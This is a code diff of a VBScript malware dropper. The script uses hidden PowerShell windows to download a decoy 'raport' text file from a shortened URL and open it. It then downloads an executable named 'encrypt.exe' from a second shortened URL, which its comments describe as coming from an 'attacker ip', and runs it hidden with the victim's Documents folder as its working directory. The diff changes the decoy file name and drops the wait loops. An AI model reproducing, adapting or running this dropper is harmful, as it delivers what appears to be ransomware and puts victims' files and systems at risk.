@@ -302,28 +302,16 @@ Set objShell = CreateObject("Wscript.Shell")
 Set objFSO = CreateObject("Scripting.FileSystemObject")
 
 ' Download fake raport
-downloadRaport = "powershell -WindowStyle Hidden -Command ""(New-Object System.Net.WebClient).DownloadFile('https://tinyurl.com/3va6t8n7', '%TEMP%\raport.txt')"""
+downloadRaport = "powershell -WindowStyle Hidden -Command ""(New-Object System.Net.WebClient).DownloadFile('https://tinyurl.com/3va6t8n7', '%TEMP%\BIGraport.txt')"""
 objShell.Run downloadRaport, 0, True
-    WScript.Sleep 1000  ' Wait for 1 second
-
-' Wait until the file has been downloaded
-Do While Not objFSO.FileExists(objShell.ExpandEnvironmentStrings("%TEMP%\raport.txt"))
-    WScript.Sleep 1000  ' Wait for 1 second
-Loop
 
 ' Open raport.txt
-openRaport = "cmd /c start """" %TEMP%\raport.txt"
+openRaport = "cmd /c start """" %TEMP%\BIGraport.txt"
 objShell.Run openRaport, 0, True
 
 ' Download the executable from attacker ip or other source
 downloadCmd = "powershell -WindowStyle Hidden -Command ""(New-Object System.Net.WebClient).DownloadFile('https://tinyurl.com/36xacafn', '%TEMP%\encrypt.exe')"""
 objShell.Run downloadCmd, 0, True
-WScript.Sleep 2000 ' Wait for 2 seconds initially (adjust this if needed)
-
-' Wait until the file has been downloaded
-Do While Not objFSO.FileExists(objShell.ExpandEnvironmentStrings("%TEMP%\encrypt.exe"))
-    WScript.Sleep 1000  ' Wait for 1 second
-Loop
 
 ' Start the exe in working directory defined below
 execCmd = "cmd /c powershell -WindowStyle Hidden -Command ""Start-Process \""%TEMP%\encrypt.exe\"" -WorkingDirectory \""$env:UserProfile\Documents\"""""
